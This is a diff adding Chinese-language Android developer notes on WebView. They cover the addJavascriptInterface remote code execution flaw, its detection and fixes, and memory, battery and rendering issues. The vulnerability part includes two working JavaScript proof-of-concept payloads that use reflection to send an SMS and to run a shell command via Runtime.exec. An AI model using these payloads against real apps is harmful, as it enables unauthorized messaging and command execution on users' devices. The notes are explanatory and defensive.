@@ -407,3 +407,134 @@ BroadcastReceiver是四大组件之一，是一种广泛运用在应用程序之
 [Android 粘性广播StickyBroadcast的使用](http://www.codeweblog.com/android-%E7%B2%98%E6%80%A7%E5%B9%BF%E6%92%ADstickybroadcast%E7%9A%84%E4%BD%BF%E7%94%A8/)
 [咦，Oreo怎么收不到广播了？](https://blog.csdn.net/dfghhvbafbga/article/details/80223938)
 [LocalBroadcastManager—创建更高效、更安全的广播](https://blog.csdn.net/u010687392/article/details/49744579)
+
+
+### WebView
+
+#### 1. WebView远程代码执行安全漏洞
+
+##### 漏洞描述
+
+Android API level 16以及之前的版本存在远程代码执行安全漏洞，该漏洞源于程序没有正确限制使用WebView.addJavascriptInterface方法，远程攻击者可通过使用Java Reflection API利用该漏洞执行任意Java对象的方法。
+
+简单的说就是通过addJavascriptInterface给WebView加入一个JavaScript桥接接口，JavaScript通过调用这个接口可以直接操作本地的JAVA接口。
+
+##### 示例代码
+
+WebView代码如下所示：
+
+```java
+mWebView = new WebView(this);
+mWebView.getSettings().setJavaScriptEnabled(true);
+mWebView.addJavascriptInterface(this, "injectedObj");
+mWebView.loadUrl("file:///android_asset/www/index.html");
+```
+
+发送恶意短信：
+
+```html
+<html>
+   <body>
+      <script>
+         var objSmsManager = injectedObj.getClass().forName("android.telephony.SmsManager").getM ethod("getDefault",null).invoke(null,null);
+          objSmsManager.sendTextMessage("10086",null,"this message is sent by JS when webview is loading",null,null);
+       </script>
+   </body>
+</html>
+```
+
+利用反射机制调用Android API getRuntime执行shell命令，最终操作用户的文件系统：
+
+```html
+<html>
+   <body>
+      <script>
+         function execute(cmdArgs)
+         {
+             return injectedObj.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
+         }
+
+         var res = execute(["/system/bin/sh", "-c", "ls -al /mnt/sdcard/"]);
+         document.write(getContents(res.getInputStream()));
+       </script>
+   </body>
+</html>
+```
+
+##### 漏洞检测
+
+1. 检查应用源代码中是否调用Landroid/webkit/WebView类中的addJavascriptInterface方法，是否存在searchBoxJavaBridge_、accessibility、accessibilityTraversal接口
+2. 在线检测：腾讯TSRC在线检测页面（http://security.tencent.com/lucky/check_tools.html）、乌云知识库在线检测（http://drops.wooyun.org/webview.html）
+3. 在线检测原理：遍历所有window的对象，然后找到包含getClass方法的对象,如果存在此方法的对象则说明该接口存在漏洞。
+
+##### 漏洞修复
+
+1. 允许被调用的函数必须以@JavascriptInterface进行注解（API Level小于17的应用也会受影响）
+2. 建议不要使用addJavascriptInterface接口，以免带来不必要的安全隐患，采用动态地生成将注入的JS代码的方式来代替
+3. 如果一定要使用addJavascriptInterface接口:
+
+    1. 如果使用HTTPS协议加载URL，应进行证书校验防止访问的页面被篡改挂马；
+    2. 如果使用HTTP协议加载URL，应进行白名单过滤、完整性校验等防止访问的页面被篡改；
+    3. 如果加载本地Html，应将html文件内置在APK中，以及进行对html页面完整性的校验；
+
+4. 移除Android系统内部的默认内置接口
+
+    ```java
+    removeJavascriptInterface("searchBoxJavaBridge_") 
+    removeJavascriptInterface("accessibility")；
+    removeJavascriptInterface("accessibilityTraversal")；
+        ```
+             
+#### 2. JSBridge
+
+客户端和服务端之间可以通过JSBridge来互相调用各自的方法，实现双向通信
+
+#### 3. WebView的正确销毁与内存泄漏问题
+
+由于WebView是依附于Activity的，Activity的生命周期和WebView启动的线程的生命周期是不一致的，这会导致WebView一直持有对这个Activity的引用而无法释放，解决方案如下
+
+1. 独立进程，简单暴力，不过可能涉及到进程间通信（推荐）
+2. 动态添加WebView，对传入WebView中使用的Context使用弱引用
+3. 正确销毁WebView，WebView在其他容器上时（如：LinearLayout），当销毁Activity时，需要：
+
+    1. 在onDestroy()中先移除容器上的WebView
+    2. 然后再将WebView.destroy()，这样就不会导致内存泄漏
+
+#### 4. WebView后台耗电
+        
+##### 问题
+
+在WebView加载页面的时候，会自动开启线程去加载，如果不很好的关闭这些线程，就会导致电量消耗加大。
+
+##### 解决方法
+
+可以采用暴力的方法，直接在onDestroy方法中System.exit(0)结束当前正在运行中的java虚拟机
+
+#### 5. WebView硬件加速
+
+##### WebView硬件加速以及缺点
+        
+Android3.0引入硬件加速，默认会开启，WebView在硬件加速的情况下滑动更加平滑，性能更加好，但是会出现白块或者页面闪烁的副作用。
+
+##### 解决方案
+
+建议在需要的地方WebView暂时关闭硬件加速
+
+#### 6. WebViewClient的onPageFinished问题
+
+##### 问题
+      
+WebViewClient.onPageFinished在每次页面加载完成的时候调用，但是遇到未加载完成的页面跳转其他页面时，就会被一直调用
+
+##### 解决方案
+
+使用WebChromeClient.onProgressChanged替代WebViewClient.onPageFinished
+
+#### 7. 参考文章
+
+[WebView 远程代码执行漏洞浅析](https://blog.csdn.net/feizhixuan46789/article/details/49155369)
+[Android WebView远程执行代码漏洞浅析](https://blog.csdn.net/fengling59/article/details/50379522)
+[Android WebView 远程代码执行漏洞简析](http://www.droidsec.cn/android-webview-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E6%A3%80%E6%B5%8B/)
+[在WebView中如何让JS与Java安全地互相调用](https://blog.csdn.net/xyz_lmn/article/details/39399225)
+
+
